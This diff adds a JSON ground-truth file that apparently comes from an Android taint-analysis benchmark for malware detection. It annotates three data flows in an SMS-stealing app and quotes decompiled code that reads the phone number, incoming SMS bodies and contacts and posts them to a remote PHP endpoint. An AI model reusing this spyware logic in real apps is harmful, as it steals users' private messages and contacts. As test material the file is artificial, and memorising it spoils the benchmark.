@@ -1,0 +1,317 @@
+{
+  "fileName": "scipiex.apk",
+  "findings": [
+    {
+      "source": {
+        "statement": "Constant.LOCAL_MOBILE = tm.getLine1Number() == null ? \"\" : tm.getLine1Number();",
+        "methodName": "public void onCreate(Bundle savedInstanceState)",
+        "className": "com.yxx.jiejie.MainActivity",
+        "lineNo": 44,
+        "targetName": "getLine1Number",
+        "targetNo": 2,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r5 = virtualinvoke $r4.<android.telephony.TelephonyManager: java.lang.String getLine1Number()>()"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "outStream.write(data);",
+        "methodName": "private String sendPostRequest(String path, Map<String, String> params, String encoding)",
+        "className": "com.yxx.jiejie.SendThread",
+        "lineNo": 118,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r12.<java.io.OutputStream: void write(byte[])>($r9)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "startService(new Intent(this, SMSListenerService.class));",
+          "methodName": "public void onCreate(Bundle savedInstanceState)",
+          "className": "com.yxx.jiejie.MainActivity",
+          "lineNo": 59,
+          "ID": 1
+        },
+        {
+          "statement": "if (Constant.INTER_MOBILE.indexOf(sender) != -1 || sender.startsWith(\"15\")) {",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.yxx.jiejie.SMSListenerService.AnonymousClass1",
+          "lineNo": 212,
+          "ID": 2
+        },
+        {
+          "statement": "new Thread(new SendThread(context, Constant.LOCAL_MOBILE + \"||\" + content + \"||\" + sender + \"||\" + SMSListenerService.this.sdf.format(time), \"/AAA.php\")).start();",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.yxx.jiejie.SMSListenerService.AnonymousClass1",
+          "lineNo": 215,
+          "ID": 3
+        },
+        {
+          "statement": "this.context = context;",
+          "methodName": "public SendThread(Context context, String content, String which)",
+          "className": "com.yxx.jiejie.SendThread",
+          "lineNo": 39,
+          "ID": 4
+        },
+        {
+          "statement": "hm.put(\"p\", this.content);",
+          "methodName": "public void run()",
+          "className": "com.yxx.jiejie.SendThread",
+          "lineNo": 46,
+          "ID": 5
+        },
+        {
+          "statement": "String rsp = sendPostRequest(getFromAsset(\"url.txt\") + this.which, hm, HTTP.UTF_8);",
+          "methodName": "public void run()",
+          "className": "com.yxx.jiejie.SendThread",
+          "lineNo": 51,
+          "ID": 6
+        },
+        {
+          "statement": "if (!(params == null || params.isEmpty())) {",
+          "methodName": "private String sendPostRequest(String path, Map<String, String> params, String encoding)",
+          "className": "com.yxx.jiejie.SendThread",
+          "lineNo": 95,
+          "ID": 7
+        },
+        {
+          "statement": "for (Entry<String, String> entry : params.entrySet()) {",
+          "methodName": "private String sendPostRequest(String path, Map<String, String> params, String encoding)",
+          "className": "com.yxx.jiejie.SendThread",
+          "lineNo": -1,
+          "ID": 8
+        },
+        {
+          "statement": "sb.append((String) entry.getKey()).append('=').append((String) entry.getValue()).append('&');",
+          "methodName": "private String sendPostRequest(String path, Map<String, String> params, String encoding)",
+          "className": "com.yxx.jiejie.SendThread",
+          "lineNo": 101,
+          "ID": 9
+        },
+        {
+          "statement": "byte[] data = sb.toString().getBytes();",
+          "methodName": "private String sendPostRequest(String path, Map<String, String> params, String encoding)",
+          "className": "com.yxx.jiejie.SendThread",
+          "lineNo": 106,
+          "ID": 10
+        }
+      ],
+      "attributes": {
+        "array": true,
+        "collections": true,
+        "interComponentCommunication": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "pathConstraints": true,
+        "staticField": true,
+        "threading": true
+      },
+      "ID": 1,
+      "description": "This malicious flow reads telephone number, stores it a static field and starts a service which listens to the incoming SMSs. The telephone number will be sent to a remote server when SMSs are received.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "SmsMessage sms = SmsMessage.createFromPdu((byte[]) pd);",
+        "methodName": "public void onReceive(Context context, Intent intent)",
+        "className": "com.yxx.jiejie.SMSListenerService.AnonymousClass1",
+        "lineNo": 206,
+        "targetName": "createFromPdu",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r16 = staticinvoke <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>($r15)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "outStream.write(data);",
+        "methodName": "private String sendPostRequest(String path, Map<String, String> params, String encoding)",
+        "className": "com.yxx.jiejie.SendThread",
+        "lineNo": 118,
+        "targetName": "write",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r12.<java.io.OutputStream: void write(byte[])>($r9)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "content = new StringBuilder(String.valueOf(content)).append(sms.getMessageBody()).toString();",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.yxx.jiejie.SMSListenerService.AnonymousClass1",
+          "lineNo": 208,
+          "ID": 1
+        },
+        {
+          "statement": "new Thread(new SendThread(context, Constant.LOCAL_MOBILE + \"||\" + content + \"||\" + sender + \"||\" + SMSListenerService.this.sdf.format(time), \"/AAA.php\")).start();",
+          "methodName": "public void onReceive(Context context, Intent intent)",
+          "className": "com.yxx.jiejie.SMSListenerService.AnonymousClass1",
+          "lineNo": 215,
+          "ID": 2
+        },
+        {
+          "statement": "this.context = context;",
+          "methodName": "public SendThread(Context context, String content, String which)",
+          "className": "com.yxx.jiejie.SendThread",
+          "lineNo": 39,
+          "ID": 3
+        },
+        {
+          "statement": "hm.put(\"p\", this.content);",
+          "methodName": "public void run()",
+          "className": "com.yxx.jiejie.SendThread",
+          "lineNo": 46,
+          "ID": 4
+        },
+        {
+          "statement": "String rsp = sendPostRequest(getFromAsset(\"url.txt\") + this.which, hm, HTTP.UTF_8);",
+          "methodName": "public void run()",
+          "className": "com.yxx.jiejie.SendThread",
+          "lineNo": 51,
+          "ID": 5
+        },
+        {
+          "statement": "if (!(params == null || params.isEmpty())) {",
+          "methodName": "private String sendPostRequest(String path, Map<String, String> params, String encoding)",
+          "className": "com.yxx.jiejie.SendThread",
+          "lineNo": 95,
+          "ID": 6
+        },
+        {
+          "statement": "for (Entry<String, String> entry : params.entrySet()) {",
+          "methodName": "private String sendPostRequest(String path, Map<String, String> params, String encoding)",
+          "className": "com.yxx.jiejie.SendThread",
+          "lineNo": -1,
+          "ID": 7
+        },
+        {
+          "statement": "sb.append((String) entry.getKey()).append('=').append((String) entry.getValue()).append('&');",
+          "methodName": "private String sendPostRequest(String path, Map<String, String> params, String encoding)",
+          "className": "com.yxx.jiejie.SendThread",
+          "lineNo": 101,
+          "ID": 8
+        },
+        {
+          "statement": "byte[] data = sb.toString().getBytes();",
+          "methodName": "private String sendPostRequest(String path, Map<String, String> params, String encoding)",
+          "className": "com.yxx.jiejie.SendThread",
+          "lineNo": 106,
+          "ID": 9
+        }
+      ],
+      "attributes": {
+        "appendToString": true,
+        "collections": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "pathConstraints": true,
+        "threading": true
+      },
+      "ID": 2,
+      "description": "This malicious flow reads received SMSs and send them to a remote server via a HTTP POST request.",
+      "isNegative": false
+    },
+    {
+      "source": {
+        "statement": "cur = cr.query(Contacts.CONTENT_URI, null, null, null, null);",
+        "methodName": "public synchronized List readAllContacts()",
+        "className": "com.yxx.jiejie.SMSListenerService",
+        "lineNo": 139,
+        "targetName": "query",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "$r6 = virtualinvoke $r4.<android.content.ContentResolver: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>($r5, null, null, null, null)"
+          }
+        ]
+      },
+      "sink": {
+        "statement": "pw.println(contact.getName() + \":\" + contact.getPhoneString());",
+        "methodName": "public void writeToFile(PrintWriter pw)",
+        "className": "com.yxx.jiejie.SMSListenerService.AnonymousClass2.AnonymousClass1",
+        "lineNo": 83,
+        "targetName": "println",
+        "targetNo": 1,
+        "IRs": [
+          {
+            "type": "Jimple",
+            "IRstatement": "virtualinvoke $r1.<java.io.PrintWriter: void println(java.lang.String)>($r6)"
+          }
+        ]
+      },
+      "intermediateFlows": [
+        {
+          "statement": "phonecursor = cr.query(Phone.CONTENT_URI, null, \"contact_id= ?\", new String[]{String.valueOf(idFromContacts)}, null);",
+          "methodName": "public synchronized List readAllContacts()",
+          "className": "com.yxx.jiejie.SMSListenerService",
+          "lineNo": 158,
+          "ID": 1
+        },
+        {
+          "statement": "arr[i] = phonecursor.getString(phonecursor.getColumnIndex(\"data1\")).trim();",
+          "methodName": "public synchronized List readAllContacts()",
+          "className": "com.yxx.jiejie.SMSListenerService",
+          "lineNo": 168,
+          "ID": 2
+        },
+        {
+          "statement": "contact.setPhone(arr);",
+          "methodName": "public synchronized List readAllContacts()",
+          "className": "com.yxx.jiejie.SMSListenerService",
+          "lineNo": 180,
+          "ID": 3
+        },
+        {
+          "statement": "phone_Map.add(contact);",
+          "methodName": "public synchronized List readAllContacts()",
+          "className": "com.yxx.jiejie.SMSListenerService",
+          "lineNo": 184,
+          "ID": 4
+        },
+        {
+          "statement": "return phone_Map;",
+          "methodName": "public synchronized List readAllContacts()",
+          "className": "com.yxx.jiejie.SMSListenerService",
+          "lineNo": 145,
+          "ID": 5
+        },
+        {
+          "statement": "final List list = SMSListenerService.this.readAllContacts();",
+          "methodName": "public void onCreate()",
+          "className": "com.yxx.jiejie.SMSListenerService",
+          "lineNo": 74,
+          "ID": 6
+        },
+        {
+          "statement": "Contact contact = (Contact) list.get(i);",
+          "methodName": "public void run()",
+          "className": "com.yxx.jiejie.SMSListenerService.AnonymousClass2",
+          "lineNo": 82,
+          "ID": 7
+        }
+      ],
+      "attributes": {
+        "array": true,
+        "collections": true,
+        "lifecycle": true,
+        "nonStaticField": true,
+        "threading": true
+      },
+      "ID": 3,
+      "description": "This malicious flow reads contacts and saves them to a file wich will be later sent to a remote server.",
+      "isNegative": false
+    }
+  ]
+}
